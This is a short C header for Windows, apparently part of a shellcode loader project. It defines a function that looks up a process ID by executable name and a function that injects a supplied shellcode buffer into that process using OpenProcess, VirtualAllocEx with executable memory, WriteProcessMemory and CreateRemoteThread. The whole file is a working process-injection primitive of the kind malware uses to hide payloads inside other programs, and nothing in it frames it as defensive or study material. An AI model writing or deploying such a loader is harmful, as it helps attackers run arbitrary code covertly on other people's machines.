#ifndef JAVA_LOADER_CRT_H
#define JAVA_LOADER_CRT_H

#endif //JAVA_LOADER_CRT_H

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <tchar.h>

DWORD GetProcessIdByName(LPCTSTR name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 entry = {sizeof(PROCESSENTRY32)};
    if (Process32First(snapshot, &entry)) {
        do {
            if (_tcsicmp(entry.szExeFile, name) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int LoadCreateRemoteThread1(unsigned char *shellcode, LPCTSTR name, int size) {
    unsigned long pid = GetProcessIdByName(name);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, size,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBaseAddress, shellcode, size, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE) lpBaseAddress, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}